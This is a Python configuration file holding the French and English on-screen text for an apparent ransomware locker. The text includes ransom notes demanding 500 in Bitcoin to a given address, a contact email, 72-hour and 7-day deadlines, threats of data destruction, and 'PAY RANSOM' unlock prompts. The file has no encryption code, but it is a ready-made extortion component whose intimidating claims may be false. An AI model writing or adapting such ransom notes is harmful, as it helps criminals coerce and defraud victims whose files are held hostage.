# config/messages.py
"""
Messages pour l'interface utilisateur
"""

RANSOM_MESSAGES = {
	"french": {
		"title": "🔒 VOS FICHIERS ONT ÉTÉ CHIFFRÉS 🔒",
		"subtitle": "Paiement requis pour récupérer vos données",
		"main_message": """
⚠️ ALERTE CRITIQUE : VOTRE SYSTÈME EST VERROUILLÉ ⚠️
Vous ne pouvez plus accéder à vos fichiers sans la clé de déchiffrement.
POUR RÉCUPÉRER VOS FICHIERS:
Effectuez un paiement de 500€ en Bitcoin à l'adresse suivante:
   bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh
        """,
		"warning": "⚠️ ALERTE CRITIQUE ⚠️",
		"description": """
Votre système a été compromis et vos fichiers sont désormais inaccessibles.
Pour obtenir la clé de déchiffrement, entrez le code de paiement ci-dessous.
        """,
		"unlock_prompt": "Code de paiement :",
		"unlock_button": "PAYER LA RANÇON",
		"attempts_remaining": "Tentatives restantes avant destruction des données : {}",
		"invalid_code": "Code de paiement invalide ! Vos fichiers restent verrouillés.",
		"system_unlocked": "Paiement confirmé ! Vos fichiers ont été déverrouillés.",
		"emergency_unlock": "Protocole d'urgence activé.",
		"unlock_instruction": "Entrez le code de paiement pour débloquer vos fichiers :",
		"unlock_code_hint": "",
  "emergency_hint": "",
	},

	"english": {
		"title": "🔒 YOUR FILES HAVE BEEN ENCRYPTED 🔒",
		"subtitle": "Payment required to recover your data",
  "main_message": """
⚠️ CRITICAL ALERT: YOUR SYSTEM IS LOCKED ⚠️

All your documents, photos, videos, and other important files have been encrypted 
with a military-grade unbreakable algorithm.

You can no longer access your files without the decryption key.
Any attempt to recover them yourself will permanently damage your data.

TO RECOVER YOUR FILES:
1. Make a payment of $500 in Bitcoin to the following address:
   bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh
2. Send proof of payment to: recovery@edulocker-secure.com
3. You will receive the decryption key within 24 hours

⏰ WARNING: You have 72 hours to pay. After this time, the price will double.
If you don't pay within 7 days, your files will be permanently lost.

        """,
		"warning": "⚠️ CRITICAL ALERT ⚠️",
		"description": """
Your system has been compromised and your files are now inaccessible.

The only way to recover your data is to pay the requested ransom.
Any other recovery attempt will fail and risks permanently 
damaging your files.

To obtain the decryption key, enter the payment code below.

        """,
		"unlock_prompt": "Payment code:",
		"unlock_button": "PAY RANSOM",
		"attempts_remaining": "Attempts remaining before data destruction: {}",
		"invalid_code": "Invalid payment code! Your files remain locked.",
		"system_unlocked": "Payment confirmed! Your files have been unlocked.",
		"emergency_unlock": "Emergency protocol activated.",
		"unlock_instruction": "Enter the payment code to unlock your files:",
		"unlock_code_hint": "",
  "emergency_hint": "",
	}
}


def get_messages(language="french"):
	"""Récupère les messages dans la langue spécifiée"""
	return RANSOM_MESSAGES.get(language, RANSOM_MESSAGES["french"])
